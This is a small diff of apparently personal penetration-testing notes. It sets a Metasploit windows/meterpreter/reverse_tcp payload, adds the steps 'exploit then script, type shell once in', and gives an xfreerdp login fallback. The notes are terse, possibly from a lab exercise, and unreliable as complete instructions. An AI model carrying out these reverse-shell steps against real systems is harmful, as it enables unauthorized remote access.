@@ -162,6 +162,10 @@ same LPORT IN MSFCONSOLE
 SCRIPT PORT IS THROUGH THE LOCAL LOOPBACK PORT 119xx
 set payload windows/meterpreter/reverse_tcp
 
+exploit then script
+type shell once in
+
+
 if it doesnt work i have to rdp into box
 
 xfreerdp /v:127.0.0.1:localport /u:Lroth /size:1920x1080
